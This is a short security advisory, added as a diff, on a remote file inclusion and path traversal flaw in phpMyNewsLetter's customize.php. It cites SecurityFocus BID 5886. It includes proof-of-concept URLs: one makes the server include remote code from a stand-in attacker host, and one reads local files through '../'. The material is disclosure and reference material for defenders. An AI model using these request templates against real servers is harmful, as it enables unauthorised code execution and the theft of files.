@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/5886/info
+
+A vulnerability has been discovered in phpMyNewsLetter.
+
+Reportedly, it is possible to pass an attacker-specified file include location to a CGI paramter of the 'customize.php' script. 
+
+This may allow an attacker to execute arbitrary commands with the privileges of the webserver.
+
+Additionally, an attacker may exploit this problem to view local webserver readable files.
+
+http://[target]/include/customize.php?l=http://[attacker]/code.txt&text=Hello%20World
+With in http://[attacker]/code.txt :
+<? echo $text; ?>
+
+or
+http://[target]/include/customize.php?l=../path/file/to/view
